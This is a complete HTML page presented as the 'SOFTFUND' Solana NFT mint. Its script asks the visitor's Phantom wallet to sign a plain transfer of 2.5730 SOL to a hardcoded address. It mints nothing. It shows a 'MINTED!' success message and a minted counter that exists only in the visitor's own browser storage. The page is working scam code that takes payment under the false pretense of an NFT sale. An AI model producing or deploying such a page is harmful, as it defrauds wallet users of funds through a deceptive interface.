<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SOFTFUND – Mint Live</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:linear-gradient(135deg,#0a001f,#1b0044,#2e0055);color:#fff;font-family:'Orbitron',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
    .container{max-width:420px;width:100%;text-align:center}
    h1{font-size:2.8rem;color:#00ff9d}
    .price{font-size:2.2rem;color:#ffd700;font-weight:bold;margin:15px 0}
    button{width:100%;max-width:340px;margin:20px auto;padding:20px;font-size:1.8rem;background:#ffd700;color:#000;border:none;border-radius:16px;cursor:pointer;font-weight:bold;box-shadow:0 0 30px rgba(255,215,0,.8);transition:.3s;}
    button:hover{background:#ffed4e;transform:scale(1.05)}
    .status{margin-top:15px;font-size:1rem;font-weight:bold}
    .loader{display:inline-block;width:14px;height:14px;border:3px solid #ffd700;border-radius:50%;border-top-color:transparent;animation:s 1s linear infinite;margin-right:8px;}
    @keyframes s{to{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="container">
    <h1>SOFTFUND</h1>
    <p>USA-Based • Solana Utility NFTs</p>
    <p class="price">2.5730 SOL</p>
    <p>Minted: <span id="minted">0</span> / 10,000</p>

    <button id="mintBtn">MINT NOW</button>

    <div id="status" class="status">Open in Phantom → Click MINT</div>
  </div>

  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
  <script>
    const PRICE = 2.5730 * 1e9;
    const YOUR_WALLET = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";
    let count = localStorage.getItem('c') || 0;
    document.getElementById('minted').textContent = count;

    const status = document.getElementById("status");
    const btn = document.getElementById("mintBtn");

    function setStatus(t, c) { status.innerHTML = t; status.style.color = c; }

    // FROM PHONE (inside Phantom)
    if (window.solana?.isPhantom) {
      btn.onclick = async () => {
        btn.disabled = true;
        setStatus("Connecting... <span class='loader'></span>", "#ffd700");
        try {
          await window.solana.connect();
          setStatus("Sending 2.5730 SOL... <span class='loader'></span>", "#ffd700");

          const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
          const tx = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
              fromPubkey: window.solana.publicKey,
              toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET),
              lamports: PRICE,
            })
          );
          tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
          tx.feePayer = window.solana.publicKey;

          const { signature } = await window.solana.signAndSendTransaction(tx);
          await conn.confirmTransaction(signature);

          count++; localStorage.setItem('c', count);
          document.getElementById('minted').textContent = count;

          setStatus(`MINTED! <a href="https://solscan.io/tx/${signature}" style="color:#00ff9d">View Tx</a>`, "#00ff9d");
          setTimeout(() => { btn.disabled = false; setStatus("Mint again?"); }, 5000);
        } catch (e) {
          setStatus("Try again", "#ff5555");
          btn.disabled = false;
        }
      };
    } else {
      // FROM COMPUTER → OPEN PHONE
      btn.onclick = () => {
        location.href = `https://phantom.app/ul/v1/connect?app_url=${encodeURIComponent(location.href)}&redirect_link=${encodeURIComponent(location.href)}`;
      };
      setStatus("Click → Phantom opens on phone → Approve", "#ffd700");
    }
  </script>
</body>
</html>